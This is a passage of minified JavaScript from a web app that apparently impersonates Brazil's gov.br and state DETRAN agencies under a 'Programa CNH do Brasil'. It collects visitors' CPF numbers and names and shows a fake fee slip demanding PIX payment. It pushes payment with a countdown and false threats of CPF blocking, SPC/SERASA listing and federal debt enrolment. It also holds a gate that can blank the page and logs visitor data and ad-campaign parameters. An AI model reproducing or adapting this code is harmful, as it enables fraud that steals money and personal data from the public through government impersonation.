                  children: [a.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "CPF"
                  }), a.jsx("p", {
                    className: "font-semibold text-gray-800",
                    children: f != null && f.cpf ? hc(f.cpf) : ""
                  })]
                })]
              }), a.jsx("div", {
                className: "p-4 border-b border-gray-300 bg-gray-50",
                children: a.jsxs("div", {
                  className: "text-center",
                  children: [a.jsx("p", {
                    className: "text-gray-500 text-xs",
                    children: "EXERCÍCIO"
                  }), a.jsx("p", {
                    className: "font-bold text-gray-800 text-lg",
                    children: os.getFullYear()
                  })]
                })
              }), a.jsx("div", {
                className: "p-4 border-b border-gray-300",
                children: a.jsxs("div", {
                  className: "grid grid-cols-3 gap-2 text-sm",
                  children: [a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "Nº RENACH"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: D
                    })]
                  }), a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "Nº GUIA"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: ((Lh = w.transaction_id + "") == null ? void 0 : Lh.slice(-10)) || ""
                    })]
                  }), a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VENCIMENTO"
                    }), a.jsx("p", {
                      className: "font-semibold text-gray-800",
                      children: _h
                    })]
                  })]
                })
              }), a.jsxs("div", {
                className: "p-4 border-b border-gray-300",
                children: [a.jsx("div", {
                  className: "bg-[#1351B4] text-white p-2 mb-2",
                  children: a.jsxs("div", {
                    className: "flex justify-between text-xs font-bold",
                    children: [a.jsx("span", {
                      children: "DISCRIMINAÇÃO DOS DÉBITOS"
                    }), a.jsx("span", {
                      children: "VALORES EM REAIS"
                    })]
                  })
                }), a.jsx("div", {
                  className: "space-y-1 text-sm",
                  children: (() => {
                    const _ = (w == null ? void 0 : w.amount) || Pe || 86.45
                      , U = po(_);
                    return a.jsxs(a.Fragment, {
                      children: [a.jsxs("div", {
                        className: "flex justify-between py-1 border-b border-gray-200",
                        children: [a.jsx("span", {
                          className: "text-gray-700",
                          children: "TAXA DE EXPEDIÇÃO DE DOCUMENTO (TED)"
                        }), a.jsx("span", {
                          className: "font-semibold",
                          children: xn(U.ted)
                        })]
                      }), a.jsxs("div", {
                        className: "flex justify-between py-1 border-b border-gray-200",
                        children: [a.jsx("span", {
                          className: "text-gray-700",
                          children: "TAXA DE SERVIÇOS ADMINISTRATIVOS (TSA)"
                        }), a.jsx("span", {
                          className: "font-semibold",
                          children: xn(U.tsa)
                        })]
                      }), a.jsxs("div", {
                        className: "flex justify-between py-1 border-b border-gray-200",
                        children: [a.jsx("span", {
                          className: "text-gray-700",
                          children: "TAXA DE PROCESSAMENTO ELETRÔNICO (TPE)"
                        }), a.jsx("span", {
                          className: "font-semibold",
                          children: xn(U.tpe)
                        })]
                      }), a.jsxs("div", {
                        className: "flex justify-between py-2 bg-gray-100 px-2 font-bold",
                        children: [a.jsx("span", {
                          children: "TOTAL"
                        }), a.jsx("span", {
                          children: xn(_)
                        })]
                      })]
                    })
                  }
                  )()
                })]
              }), a.jsxs("div", {
                className: "p-4 border-b border-gray-300 bg-red-50",
                children: [a.jsx("p", {
                  className: "text-sm text-red-600 font-bold mb-2",
                  children: "Observações:"
                }), a.jsxs("p", {
                  className: "text-sm text-red-600 mb-1",
                  children: ["Informamos que, caso o pagamento não seja realizado dentro do prazo estabelecido, o ", a.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " do responsável (", a.jsx("span", {
                    className: "font-bold",
                    children: hc((f == null ? void 0 : f.cpf) || "")
                  }), ") será bloqueado no programa pelo período de ", a.jsx("span", {
                    className: "font-bold",
                    children: "18 (dezoito) meses"
                  }), ". Além disso, o valor da taxa, acrescido de multas, será registrado no ", a.jsx("span", {
                    className: "font-bold",
                    children: "CPF"
                  }), " junto aos órgãos de proteção ao crédito (", a.jsx("span", {
                    className: "font-bold",
                    children: "SPC"
                  }), " e ", a.jsx("span", {
                    className: "font-bold",
                    children: "SERASA"
                  }), "), bem como inscrito em ", a.jsx("span", {
                    className: "font-bold",
                    children: "Dívida Ativa da União"
                  }), ", nos termos do art. 2º da ", a.jsx("span", {
                    className: "font-bold",
                    children: "Lei nº 6.830/1980"
                  }), " (Lei de Execuções Fiscais) e do art. 43 da ", a.jsx("span", {
                    className: "font-bold",
                    children: "Lei nº 8.078/1990"
                  })]
                })]
              }), a.jsx("div", {
                className: "p-4 text-xs text-gray-500 border-b border-gray-300",
                children: a.jsxs("p", {
                  children: ["EMITIDO EM ", gc, " ÀS ", Ih]
                })
              }), a.jsxs("div", {
                className: "bg-gray-100 p-4 border-t-2 border-dashed border-gray-400",
                children: [a.jsxs("div", {
                  className: "text-center mb-3",
                  children: [a.jsxs("p", {
                    className: "font-bold text-sm text-[#1351B4]",
                    children: ["DETRAN/", (y == null ? void 0 : y.uf) || "", " - PAGAMENTO VIA PIX"]
                  }), a.jsx("p", {
                    className: "text-xs text-gray-600",
                    children: "Programa CNH do Brasil - Taxas Administrativas"
                  })]
                }), w.qr_code_image && a.jsxs("div", {
                  className: "bg-white p-3 rounded border border-gray-300 mb-3 flex flex-col items-center",
                  children: [a.jsx("p", {
                    className: "text-xs text-gray-500 mb-2",
                    children: "QR CODE PIX:"
                  }), a.jsx("img", {
                    src: w.qr_code_image,
                    alt: "QR Code PIX",
                    className: "w-48 h-48 object-contain"
                  })]
                }), a.jsxs("div", {
                  className: "bg-white p-3 rounded border border-gray-300 mb-3",
                  children: [a.jsx("p", {
                    className: "text-xs text-gray-500 mb-1",
                    children: "CÓDIGO PIX COPIA E COLA:"
                  }), a.jsx("p", {
                    className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                    children: w.pix_code
                  })]
                }), a.jsx("button", {
                  onClick: $w,
                  className: "w-full flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium",
                  children: A ? a.jsxs(a.Fragment, {
                    children: [a.jsx(Ft, {
                      className: "w-5 h-5"
                    }), a.jsx("span", {
                      children: "Código Copiado!"
                    })]
                  }) : a.jsxs(a.Fragment, {
                    children: [a.jsx(Kl, {
                      className: "w-5 h-5"
                    }), a.jsx("span", {
                      children: "Copiar Código PIX"
                    })]
                  })
                }), a.jsxs("div", {
                  className: "mt-3 flex justify-between text-sm",
                  children: [a.jsxs("div", {
                    children: [a.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VENCIMENTO DA GUIA"
                    }), a.jsx("p", {
                      className: "font-bold",
                      children: _h
                    })]
                  }), a.jsxs("div", {
                    className: "text-right",
                    children: [a.jsx("p", {
                      className: "text-gray-500 text-xs",
                      children: "VALOR A PAGAR EM REAIS"
                    }), a.jsxs("p", {
                      className: "font-bold text-lg",
                      children: ["R$ ", xn((w == null ? void 0 : w.amount) || Pe || 86.45)]
                    })]
                  })]
                }), o === "awaiting_payment" && a.jsx("div", {
                  className: "mt-4 pt-4 border-t-2 border-dashed border-gray-400",
                  children: a.jsxs("div", {
                    className: "bg-yellow-50 border border-yellow-300 rounded-lg p-3 text-center",
                    children: [a.jsxs("div", {
                      className: "flex items-center justify-center gap-2 mb-1",
                      children: [a.jsxs("div", {
                        className: "flex items-center gap-1",
                        children: [a.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse"
                        }), a.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse",
                          style: {
                            animationDelay: "150ms"
                          }
                        }), a.jsx("span", {
                          className: "w-2 h-2 bg-yellow-500 rounded-full animate-pulse",
                          style: {
                            animationDelay: "300ms"
                          }
                        })]
                      }), a.jsx("span", {
                        className: "text-yellow-800 font-semibold text-sm",
                        children: "AGUARDANDO PAGAMENTO"
                      })]
                    }), a.jsxs("p", {
                      className: "text-yellow-700 text-xs",
                      children: ["Esta guia vence em: ", a.jsx("span", {
                        className: "font-bold text-yellow-900",
                        children: zw(z)
                      })]
                    })]
                  })
                })]
              })]
            })
          }), $.map((_, U) => a.jsx("div", {
            className: `mb-4 ${_.isIncoming ? "text-left" : "text-right"}`,
            children: a.jsx("div", {
              className: `inline-block max-w-[80%] p-4 rounded-2xl shadow-sm text-base ${_.isIncoming ? "bg-[#2670CC] text-white rounded-tl-sm" : "bg-gray-200 text-gray-800 rounded-tr-sm"}`,
              style: {
                lineHeight: "1.5",
                fontSize: "16px",
                whiteSpace: "pre-line"
              },
              children: _.text.split("**").map((K, he) => he % 2 === 1 ? a.jsx("strong", {
                children: K
              }, he) : K)
            })
          }, `post-pix-${U}`)), o === "awaiting_payment" && a.jsxs(a.Fragment, {
            children: [$i && a.jsx("div", {
              className: "flex justify-center my-4",
              children: a.jsxs("div", {
                className: "bg-white border border-gray-200 rounded-lg p-4 flex items-center gap-3 shadow-sm",
                children: [a.jsx(dt, {
                  className: "w-5 h-5 animate-spin text-[#1351B4]"
                }), a.jsx("span", {
                  className: "text-gray-700",
                  children: "Verificando pagamento..."
                })]
              })
            }), !Hi && a.jsx("div", {
              className: "flex flex-col gap-3 max-w-[80%] mt-4",
              children: a.jsxs("button", {
                onClick: Lw,
                disabled: $i,
                className: "flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-sm shadow-md hover:bg-[#16a34a] transition-all disabled:opacity-50 disabled:cursor-not-allowed",
                children: [a.jsx(Ft, {
                  className: "w-5 h-5"
                }), a.jsx("span", {
                  className: "font-medium",
                  children: "Ativar meu cadastro"
                })]
              })
            }), Hi && a.jsxs("div", {
              className: "w-full mt-4 mb-4",
              children: [a.jsx("div", {
                className: "mb-4 text-left",
                children: a.jsx("div", {
                  className: "inline-block bg-[#2670CC] text-white px-4 py-3 rounded-2xl rounded-tl-sm shadow-sm",
                  style: {
                    fontSize: "16px",
                    whiteSpace: "pre-line"
                  },
                  children: "Não foi possível confirmar o pagamento automaticamente. Para ativar seu cadastro, clique abaixo e envie uma imagem do comprovante de pagamento."
                })
              }), a.jsx("input", {
                type: "file",
                ref: cc,
                onChange: Fw,
                accept: "image/*,.pdf",
                className: "hidden"
              }), a.jsxs("div", {
                className: "bg-white border border-gray-300 rounded-lg p-4 shadow-sm",
                children: [a.jsxs("button", {
                  onClick: Vw,
                  className: "w-full flex items-center justify-center gap-3 p-4 border-2 border-dashed border-gray-300 rounded-lg hover:border-[#1351B4] hover:bg-gray-50 transition-all",
                  children: [a.jsx(lN, {
                    className: "w-6 h-6 text-gray-500"
                  }), a.jsx("span", {
                    className: "text-gray-600 font-medium",
                    children: Ut ? Ut.name : "Clique para selecionar o comprovante"
                  })]
                }), Ut && a.jsxs("button", {
                  onClick: Bw,
                  className: "w-full mt-3 flex items-center justify-center gap-2 p-4 bg-[#22c55e] text-white rounded-md shadow-md hover:bg-[#16a34a] transition-all font-medium",
                  children: [a.jsx(Ft, {
                    className: "w-5 h-5"
                  }), a.jsx("span", {
                    children: "Enviar e ativar cadastro"
                  })]
                })]
              })]
            })]
          })]
        })
      })
    })]
  })
}
const yT = {
  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg"
};
function vT() {
  const t = kx().cpf || ""
    , [, n] = Un()
    , [r, s] = x.useState(null)
    , [o, i] = x.useState(!0)
    , [l, c] = x.useState(null)
    , [u, d] = x.useState(!1)
    , [f, h] = x.useState(600)
    , [y, b] = x.useState("pending")
    , v = S => S.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
    , C = S => {
      const N = Math.floor(S / 60)
        , P = S % 60;
      return `${String(N).padStart(2, "0")}:${String(P).padStart(2, "0")}`
    }
    ;
  x.useEffect(() => {
    t && (async () => {
      try {
        const P = await (await fetch(`/api/transaction/${t}`)).json();
        P.success ? (s(P.transaction),
          P.transaction.nome && localStorage.setItem("userData", JSON.stringify({
            nome: P.transaction.nome
          }))) : c(P.error || "Transação não encontrada")
      } catch {
        c("Erro ao buscar transação")
      } finally {
        i(!1)
      }
    }
    )()
  }
    , [t]);
  const g = x.useCallback(async S => {
    try {
      const P = await (await fetch(`/api/check-pix.php/${S}`)).json();
      if (P.success && P.status && (b(P.status),
        P.status === "paid")) {
        if (typeof window < "u" && window.fbq) {
          const A = window.fbq;
          A("track", "Purchase", {
            value: parseFloat((r == null ? void 0 : r.amount) || "95.00"),
            currency: "BRL",
            content_type: "product",
            content_ids: [S],
            transaction_id: (r == null ? void 0 : r.transactionId) || S
          })
        }
        return setTimeout(() => {
          n("/success")
        }
          , 1e3),
          !0
      }
      return !1
    } catch (N) {
      return console.error("Erro ao verificar status:", N),
        !1
    }
  }
    , [r, n]);
  x.useEffect(() => {
    if (!(r != null && r.depositId))
      return;
    const S = setInterval(async () => {
      await g(r.depositId) && clearInterval(S)
    }
      , 3e3);
    return () => clearInterval(S)
  }
    , [r == null ? void 0 : r.depositId, g]),
    x.useEffect(() => {
      if (f <= 0)
        return;
      const S = setInterval(() => {
        h(N => N <= 1 ? (clearInterval(S),
          0) : N - 1)
      }
        , 1e3);
      return () => clearInterval(S)
    }
      , [f]);
  const m = async () => {
    r != null && r.pixCode && (await navigator.clipboard.writeText(r.pixCode),
      d(!0),
      setTimeout(() => d(!1), 3e3))
  }
    , p = new Date
    , w = `${p.getDate().toString().padStart(2, "0")}/${(p.getMonth() + 1).toString().padStart(2, "0")}/${p.getFullYear()}`;
  return o ? a.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [a.jsx(st, {}), a.jsx("div", {
      className: "flex-1 flex items-center justify-center",
      children: a.jsxs("div", {
        className: "text-center",
        children: [a.jsx(dt, {
          className: "w-12 h-12 animate-spin text-[#1351B4] mx-auto mb-4"
        }), a.jsx("p", {
          className: "text-gray-600",
          children: "Carregando dados do pagamento..."
        })]
      })
    })]
  }) : l || !r ? a.jsxs("div", {
    className: "min-h-screen bg-white flex flex-col",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "flex-1 flex items-center justify-center p-4",
      children: a.jsxs("div", {
        className: "text-center",
        children: [a.jsx(ap, {
          className: "w-16 h-16 text-yellow-500 mx-auto mb-4"
        }), a.jsx("h1", {
          className: "text-xl font-bold text-gray-800 mb-2",
          children: "Transação não encontrada"
        }), a.jsx("p", {
          className: "text-gray-600",
          children: l || "Não foi possível localizar uma transação para este CPF."
        })]
      })
    })]
  }) : a.jsxs("div", {
    className: "min-h-screen bg-gray-50 flex flex-col",
    children: [a.jsx(st, {}), a.jsx("main", {
      className: "flex-1 p-4",
      children: a.jsxs("div", {
        className: "max-w-lg mx-auto",
        children: [a.jsx("div", {
          className: "bg-yellow-50 rounded-lg p-4 mb-4",
          children: a.jsxs("div", {
            className: "flex items-start gap-3",
            children: [a.jsx(ap, {
              className: "w-6 h-6 text-yellow-600 flex-shrink-0 mt-0.5"
            }), a.jsxs("div", {
              children: [a.jsx("p", {
                className: "font-bold text-yellow-800",
                children: "PAGAMENTO OBRIGATÓRIO"
              }), a.jsx("p", {
                className: "text-sm text-yellow-700 mt-1",
                children: "O pagamento das taxas administrativas é obrigatório para garantir sua vaga no programa. Caso não seja realizado, seu CPF ficará bloqueado por 2 anos."
              })]
            })]
          })
        }), a.jsx("div", {
          className: "bg-red-50 rounded-lg p-4 mb-4",
          children: a.jsxs("div", {
            className: "text-center",
            children: [a.jsx("p", {
              className: "font-bold text-red-800",
              children: "A guia de pagamento vence em:"
            }), a.jsx("p", {
              className: "text-3xl font-bold text-red-600 mt-2",
              children: C(f)
            })]
          })
        }), a.jsxs("div", {
          className: "bg-white border-2 border-gray-300 shadow-lg",
          style: {
            fontFamily: "Arial, sans-serif"
          },
          children: [a.jsx("div", {
            className: "bg-white p-4 border-b border-gray-300",
            children: a.jsxs("div", {
              className: "flex flex-col items-center",
              children: [a.jsx("img", {
                src: yT[r.detranUf] || "",
                alt: `Brasão do Estado - DETRAN ${r.detranUf}`,
                className: "h-16 max-w-[200px] object-contain mb-2",
                onError: S => {
                  S.target.style.display = "none"
                }
              }), a.jsxs("p", {
                className: "text-sm font-bold text-gray-800",
                children: ["DETRAN/", r.detranUf, " - GUIA DE RECOLHIMENTO"]
              }), a.jsx("p", {
                className: "text-xs text-gray-600",
                children: "TAXAS ADMINISTRATIVAS CNH"
              })]
            })
          }), a.jsxs("div", {
            className: "p-4 border-b border-gray-300",
            children: [a.jsxs("div", {
              children: [a.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "CONTRIBUINTE"
              }), a.jsx("p", {
                className: "font-bold text-gray-800",
                children: r.nome.toUpperCase()
              })]
            }), a.jsxs("div", {
              className: "mt-2",
              children: [a.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "CPF"
              }), a.jsx("p", {
                className: "font-semibold text-gray-800",
                children: v(r.cpf)
              })]
            })]
          }), a.jsx("div", {
            className: "p-4 border-b border-gray-300 bg-gray-50",
            children: a.jsxs("div", {
              className: "text-center",
              children: [a.jsx("p", {
                className: "text-gray-500 text-xs",
                children: "EXERCÍCIO"
              }), a.jsx("p", {
                className: "font-bold text-gray-800 text-lg",
                children: p.getFullYear()
              })]
            })
          }), a.jsx("div", {
            className: "p-4 border-b border-gray-300",
            children: a.jsxs("div", {
              className: "grid grid-cols-3 gap-2 text-sm",
              children: [a.jsxs("div", {
                children: [a.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TED"
                }), a.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 37,40"
                })]
              }), a.jsxs("div", {
                children: [a.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TSA"
                }), a.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 28,80"
                })]
              }), a.jsxs("div", {
                children: [a.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "TPE"
                }), a.jsx("p", {
                  className: "font-semibold",
                  children: "R$ 28,80"
                })]
              })]
            })
          }), a.jsxs("div", {
            className: "p-4 bg-[#E8F0FE]",
            children: [a.jsxs("div", {
              className: "text-center mb-3",
              children: [a.jsxs("p", {
                className: "font-bold text-sm text-[#1351B4]",
                children: ["DETRAN/", r.detranUf, " - PAGAMENTO VIA PIX"]
              }), a.jsx("p", {
                className: "text-xs text-gray-600",
                children: "Programa CNH do Brasil - Taxas Administrativas"
              })]
            }), r.qrCodeImage && a.jsxs("div", {
              className: "bg-white p-3 rounded border border-gray-300 mb-3 flex flex-col items-center",
              children: [a.jsx("p", {
                className: "text-xs text-gray-500 mb-2",
                children: "QR CODE PIX:"
              }), a.jsx("img", {
                src: r.qrCodeImage,
                alt: "QR Code PIX",
                className: "w-48 h-48 object-contain"
              })]
            }), a.jsxs("div", {
              className: "bg-white p-3 rounded border border-gray-300 mb-3",
              children: [a.jsx("p", {
                className: "text-xs text-gray-500 mb-1",
                children: "CÓDIGO PIX COPIA E COLA:"
              }), a.jsx("p", {
                className: "text-xs break-all font-mono bg-gray-50 p-2 rounded border",
                children: r.pixCode
              })]
            }), a.jsx("button", {
              onClick: m,
              className: "w-full flex items-center justify-center gap-2 p-4 bg-[#1351B4] text-white rounded-md shadow-md hover:bg-[#0D3A8C] transition-all font-medium",
              children: u ? a.jsxs(a.Fragment, {
                children: [a.jsx(Ft, {
                  className: "w-5 h-5"
                }), a.jsx("span", {
                  children: "Código Copiado!"
                })]
              }) : a.jsxs(a.Fragment, {
                children: [a.jsx(Kl, {
                  className: "w-5 h-5"
                }), a.jsx("span", {
                  children: "Copiar Código PIX"
                })]
              })
            }), a.jsxs("div", {
              className: "mt-3 flex justify-between text-sm",
              children: [a.jsxs("div", {
                children: [a.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "VENCIMENTO DA GUIA"
                }), a.jsx("p", {
                  className: "font-bold",
                  children: w
                })]
              }), a.jsxs("div", {
                className: "text-right",
                children: [a.jsx("p", {
                  className: "text-gray-500 text-xs",
                  children: "VALOR A PAGAR EM REAIS"
                }), a.jsxs("p", {
                  className: "font-bold text-lg",
                  children: ["R$ ", parseFloat(r.amount).toFixed(2).replace(".", ",")]
                })]
              })]
            })]
          })]
        }), a.jsxs("div", {
          className: "mt-4 bg-[#2670CC] text-white p-4 rounded-lg",
          children: [a.jsxs("div", {
            className: "flex items-center gap-3 mb-2",
            children: [a.jsx("span", {
              children: "Aguardando pagamento"
            }), a.jsxs("div", {
              className: "flex items-center gap-1",
              children: [a.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "0ms"
                }
              }), a.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "150ms"
                }
              }), a.jsx("span", {
                className: "w-2 h-2 bg-white rounded-full animate-bounce",
                style: {
                  animationDelay: "300ms"
                }
              })]
            })]
          }), a.jsx("p", {
            className: "text-sm",
            children: "Assim que o pagamento for confirmado, você será redirecionado automaticamente."
          })]
        })]
      })
    })]
  })
}
let Qg = !1;
function xT() {
  if (Qg)
    return;
  Qg = !0,
    function (t, n, r, s, o) {
      var c;
      t[r] = t[r] || function () {
        (t[r].q = t[r].q || []).push(arguments)
      }
        ;
      const i = n.createElement(s);
      i.async = !0,
        i.src = "https://www.clarity.ms/tag/" + o;
      const l = n.getElementsByTagName(s)[0];
      (c = l.parentNode) == null || c.insertBefore(i, l)
    }(window, document, "clarity", "script", "uje4o1wabk"),
    function (t, n, r) {
      t.TiktokAnalyticsObject = r;
      const s = t[r] = t[r] || [];
      s.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"],
        s.setAndDefer = function (o, i) {
          o[i] = function () {
            o.push([i].concat(Array.prototype.slice.call(arguments, 0)))
          }
        }
        ;
      for (let o = 0; o < s.methods.length; o++)
        s.setAndDefer(s, s.methods[o]);
      s.instance = function (o) {
        const i = s._i[o] || [];
        for (let l = 0; l < s.methods.length; l++)
          s.setAndDefer(i, s.methods[l]);
        return i
      }
        ,
        s.load = function (o, i) {
          var d;
          const l = "https://analytics.tiktok.com/i18n/pixel/events.js";
          s._i = s._i || {},
            s._i[o] = [],
            s._i[o]._u = l,
            s._t = s._t || {},
            s._t[o] = +new Date,
            s._o = s._o || {},
            s._o[o] = i || {};
          const c = n.createElement("script");
          c.type = "text/javascript",
            c.async = !0,
            c.src = l + "?sdkid=" + o + "&lib=" + r;
          const u = n.getElementsByTagName("script")[0];
          (d = u.parentNode) == null || d.insertBefore(c, u)
        }
        ,
        s.load("D3A8DARC77UFKOQ7M5PG"),
        s.page()
    }(window, document, "ttq"),
    function (t, n, r, s) {
      var c;
      if (t.fbq)
        return;
      const o = t.fbq = function () {
        o.callMethod ? o.callMethod.apply(o, arguments) : o.queue.push(arguments)
      }
        ;
      t._fbq || (t._fbq = o),
        o.push = o,
        o.loaded = !0,
        o.version = "2.0",
        o.queue = [];
      const i = n.createElement(r);
      i.async = !0,
        i.src = s;
      const l = n.getElementsByTagName(r)[0];
      (c = l.parentNode) == null || c.insertBefore(i, l)
    }(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
  const e = window.fbq;
  e && (e("init", "3270339329986286"),
    e("init", "1555494242118668"),
    e("init", "1154359756859567"),
    e("init", "2062889337802425"),
    e("track", "PageView")),
    document.title = "gov.br - Programa CNH do Brasil"
}
function qg() {
  const e = navigator.userAgent || navigator.vendor || window.opera || ""
    , t = e.indexOf("FBAN") > -1 || e.indexOf("FBAV") > -1 || e.indexOf("FB_IAB") > -1 || e.indexOf("FB4A") > -1 || e.indexOf("FBIOS") > -1
    , n = e.indexOf("Instagram") > -1
    , r = e.indexOf("FB_MESSENGER") > -1 || e.indexOf("MESSENGER") > -1 || e.indexOf("Messenger") > -1;
  return {
    isFacebook: t,
    isInstagram: n,
    isMessenger: r,
    isAllowed: !0,
    userAgent: e
  }
}
function wT() {
  const e = new URLSearchParams(window.location.search);
  return {
    fbclid: e.get("fbclid"),
    utmSource: e.get("utm_source"),
    utmMedium: e.get("utm_medium"),
    utmCampaign: e.get("utm_campaign"),
    utmContent: e.get("utm_content"),
    utmTerm: e.get("utm_term")
  }
}
async function bT(e) {
  var n;
  const t = wT();
  try {
    await fetch("/api/log-access", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        userAgent: e.userAgent,
        isFacebook: e.isFacebook,
        isInstagram: e.isInstagram,
        isMessenger: e.isMessenger,
        isAllowed: e.isAllowed,
        referrer: document.referrer || null,
        url: window.location.href,
        fbclid: t.fbclid,
        utmSource: t.utmSource,
        utmMedium: t.utmMedium,
        utmCampaign: t.utmCampaign,
        utmContent: t.utmContent,
        utmTerm: t.utmTerm,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: ((n = navigator.userAgentData) == null ? void 0 : n.platform) || navigator.platform || ""
      })
    })
  } catch (r) {
    console.error("Error logging access:", r)
  }
}
function Tw() {
  const e = window.location.pathname;
  return /^\/\d{11}$/.test(e)
}
function ST() {
  const e = window.location.pathname;
  return e === "/comprovantes" || e.startsWith("/comprovantes")
}
function CT() {
  const e = window.location.hostname
    , t = e.includes("replit.dev") || e === "localhost" || e === "127.0.0.1"
    , n = e.includes(".replit.app");
  return t && !n
}
function NT() {
  const e = window.location.hostname;
  return e === "gov.operadora.inc" || e.includes("operadora.inc") ? Tw() : !1
}
function jT({ children: e }) {
  const [t, n] = x.useState(() => {
    const o = qg()
      , i = Tw()
      , l = CT()
      , c = NT()
      , u = ST();
    return o.isAllowed || i || l || c || u
  }
  )
    , [r, s] = x.useState(!1);
  return x.useEffect(() => {
    if (!r) {
      const o = qg();
      bT(o),
        s(!0)
    }
  }
    , [r]),
    t ? (xT(),
      a.jsx(a.Fragment, {
        children: e
      })) : (document.title = "about:blank",
        document.body.style.margin = "0",
        document.body.style.padding = "0",
        document.body.style.backgroundColor = "white",
        null)
}
var kw = {
  color: void 0,
  size: void 0,
  className: void 0,
  style: void 0,
  attr: void 0
}
  , Gg = ue.createContext && ue.createContext(kw)
  , PT = ["attr", "size", "title"];
function AT(e, t) {
  if (e == null)
    return {};
  var n = ET(e, t), r, s;
  if (Object.getOwnPropertySymbols) {
    var o = Object.getOwnPropertySymbols(e);
    for (s = 0; s < o.length; s++)
      r = o[s],
        !(t.indexOf(r) >= 0) && Object.prototype.propertyIsEnumerable.call(e, r) && (n[r] = e[r])
  }
  return n
}
function ET(e, t) {
  if (e == null)
    return {};
  var n = {};
  for (var r in e)
    if (Object.prototype.hasOwnProperty.call(e, r)) {
      if (t.indexOf(r) >= 0)
        continue;
      n[r] = e[r]
    }
  return n
}
function jl() {
  return jl = Object.assign ? Object.assign.bind() : function (e) {
    for (var t = 1; t < arguments.length; t++) {
      var n = arguments[t];
      for (var r in n)
